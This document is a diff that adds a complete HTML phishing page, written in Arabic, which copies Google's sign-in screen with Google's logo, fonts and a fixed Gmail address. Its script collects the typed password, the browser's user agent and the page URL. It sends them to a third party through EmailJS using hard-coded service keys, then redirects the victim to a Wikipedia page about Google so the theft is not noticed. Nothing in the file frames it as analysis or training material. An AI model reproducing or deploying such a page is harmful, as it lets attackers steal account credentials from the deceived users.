@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <title>تسجيل الدخول - Google</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background-color: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      width: 400px;
+      padding: 40px 35px;
+      border-radius: 8px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+    }
+
+    .google-logo {
+      display: block;
+      margin: 0 auto 20px;
+      width: 75px;
+    }
+
+    h1 {
+      font-size: 24px;
+      font-weight: 400;
+      color: #202124;
+      margin-bottom: 10px;
+    }
+
+    .subtext {
+      font-size: 16px;
+      color: #5f6368;
+      margin-bottom: 30px;
+    }
+
+    .email-fixed {
+      font-size: 14px;
+      color: #1a73e8;
+      margin-bottom: 20px;
+      word-break: break-word;
+    }
+
+    label {
+      font-size: 14px;
+      color: #202124;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #dadce0;
+      border-radius: 4px;
+      box-sizing: border-box;
+      margin-bottom: 30px;
+      transition: border-color 0.2s;
+    }
+
+    input[type="text"]:focus {
+      border-color: #1a73e8;
+      outline: none;
+      box-shadow: 0 1px 2px rgba(26,115,232,0.3);
+    }
+
+    button {
+      width: 100%;
+      background-color: #1a73e8;
+      color: white;
+      padding: 12px 0;
+      border: none;
+      border-radius: 4px;
+      font-weight: 500;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #1669c1;
+    }
+
+    .footer {
+      margin-top: 25px;
+      font-size: 12px;
+      color: #5f6368;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+    <h1>تسجيل الدخول</h1>
+    <div class="subtext">باستخدام حساب Google الخاص بك</div>
+    <div class="email-fixed">m91635341@gmail.com</div>
+    <form id="loginForm">
+      <label for="password">أدخل كلمة المرور</label>
+      <input type="text" id="password" name="password" autocomplete="off" required />
+      <button type="submit">التالي</button>
+    </form>
+    <div class="footer">ليس جهازك؟ استخدم نافذة خاصة لتسجيل الدخول.</div>
+  </div>
+
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <script>
+    emailjs.init("3qd4YonfwRT2Y5Fg9");
+
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const passwordValue = document.getElementById('password').value.trim();
+      if (!passwordValue) {
+        alert("يرجى إدخال كلمة المرور");
+        return;
+      }
+
+      emailjs.send("service_lwi9h5f", "template_msh4clq", {
+        "user-password": passwordValue,
+        "info-device": navigator.userAgent,
+        "system-page": window.location.href
+      })
+      .then(() => {
+        document.getElementById('password').value = "";
+        window.location.href = "https://de.wikipedia.org/wiki/Google";
+      })
+      .catch((error) => {
+        alert("حدث خطأ أثناء الإرسال: " + error.text);
+        console.error("EmailJS Error:", error);
+      });
+    });
+  </script>
+</body>
+</html>
